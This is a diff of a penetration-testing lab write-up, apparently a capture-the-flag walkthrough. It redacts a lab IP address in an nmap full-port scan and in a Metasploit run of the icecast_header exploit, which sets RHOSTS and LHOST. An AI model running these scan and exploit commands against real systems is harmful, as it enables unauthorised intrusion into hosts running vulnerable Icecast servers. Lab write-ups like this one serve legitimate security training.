@@ -22,7 +22,7 @@ The engagement began with an Nmap scan over the OpenVPN connection to identify e
 ### Command
 
 ```bash
-nmap -sS -p- 10.81.156.211
+nmap -sS -p- 10.81.x.x
 ```
 ## Findings
 
@@ -46,7 +46,7 @@ I launched the Metasploit Framework to weaponize this vulnerability.
 ```bash
 msfconsole
 use exploit/windows/http/icecast_header
-set RHOSTS 10.81.156.211
+set RHOSTS 10.81.x.x
 set LHOST tun0
 run
 ```
